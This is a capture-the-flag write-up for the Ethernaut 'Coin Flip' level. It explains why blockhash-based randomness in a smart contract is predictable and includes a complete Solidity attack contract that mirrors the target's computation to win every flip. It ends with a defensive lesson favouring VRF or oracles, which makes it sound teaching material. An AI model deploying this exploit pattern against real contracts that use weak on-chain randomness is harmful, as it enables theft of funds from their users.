# Ethernaut — Coin Flip (Level) — What the bug was + how to solve it

## What the level is about
This level teaches why **on-chain randomness is not really random**, and how contracts that rely on `blockhash`, `block.number`, or similar block data for randomness can be predicted and exploited.

The contract tries to simulate a coin flip using:

- `blockhash(block.number - 1)`
- A fixed `FACTOR` to reduce it to either 0 or 1

But:
- `blockhash` is public and deterministic
- The computation is entirely reproducible off-chain or in another contract
- Therefore, you can **predict the outcome before calling `flip()`**

So the "random" coin flip is actually **fully predictable**.

---

## Why we use Remix for this level
We use **Remix** because:
- We need to deploy our own attacking smart contract.
- The attack requires executing the exact same logic as the target contract **inside the same block context**.
- If we try to compute the blockhash from JavaScript (web3), we might be:
  - one block too late,
  - or desynchronized,
  - or front-run / reordered by miners.

By deploying a contract that:
- calls `blockhash(block.number - 1)` on-chain,
- computes the same `side`,
- and calls `flip()` with the correct guess in the same transaction,

we guarantee the values match.

So: **we need a smart contract to mirror the randomness logic inside the EVM.**

---

## The real vulnerability (the flaw)

The vulnerability is that:

- `blockhash(block.number - 1)` is predictable
- The math is deterministic: `uint256(blockhash) / FACTOR` is either 0 or 1
- Anyone can replicate the logic and always guess correctly

So randomness based on block data is insecure.

---

## Attacking smart contract (to deploy in Remix)

```
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}
```

---

## How to use it

1) Deploy `CoinFlipAttack` in Remix with the CoinFlip level address as constructor parameter  
2) Call `attack()` once per block (wait for a new block between calls)  
3) Repeat until `consecutiveWins == 10`

---

## Command to check your progress (Ethernaut console)

```
await contract.consecutiveWins()
```

---

## Summary

- The contract assumes block data is random — it is not.
- All randomness is predictable by anyone observing the chain.
- You exploit this by mirroring the same computation in a contract.
- You must use Remix to deploy the attacking contract so that the block context matches.

Lesson: Never use block data for randomness in adversarial environments — use VRF or oracles.